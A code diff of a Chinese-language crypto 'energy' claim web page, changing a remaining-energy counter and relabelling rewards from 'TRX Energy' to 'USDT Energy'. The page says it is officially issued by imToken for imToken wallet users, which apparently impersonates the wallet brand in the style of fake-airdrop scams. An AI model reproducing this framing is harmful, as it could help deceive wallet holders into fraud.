@@ -302,7 +302,7 @@ body {
             </div>
             <div class="resource-content" style="line-height: 2;">
                 <p id="contractAddrText">• 合约地址：<span class="highlight" id="contractAddr"></span></p>
-                <p id="contractEnergyText">• 剩余能量：<span class="highlight data-tag" id="contractEnergy">4104470400000</span></p>
+                <p id="contractEnergyText">• 剩余能量：<span class="highlight data-tag" id="contractEnergy"></span></p>
                 <p style="font-size: 12px; color: #a0a8a4; margin-top: 5px;" id="contractNote">
                     注：所有剩余量为“ 0 ”时停止领取，该项目为imToken官方发行，只限imToken钱包用户参与。
                 </p>
@@ -1078,7 +1078,7 @@ function renderEnergyRecords() {
         <div class='record-item'>
             <p><strong>${lang.recordAddress}</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
             <p><strong>${lang.recordType}</strong>${record.recordType}</p>
-            <p><strong>${lang.recordEnergy}</strong>${record.energyAmount} TRX Energy</p>
+            <p><strong>${lang.recordEnergy}</strong>${record.energyAmount} USDT Energy</p>
             <p><strong>${lang.recordTime}</strong>${record.receiveTime}</p>
         </div>
     `).join("");
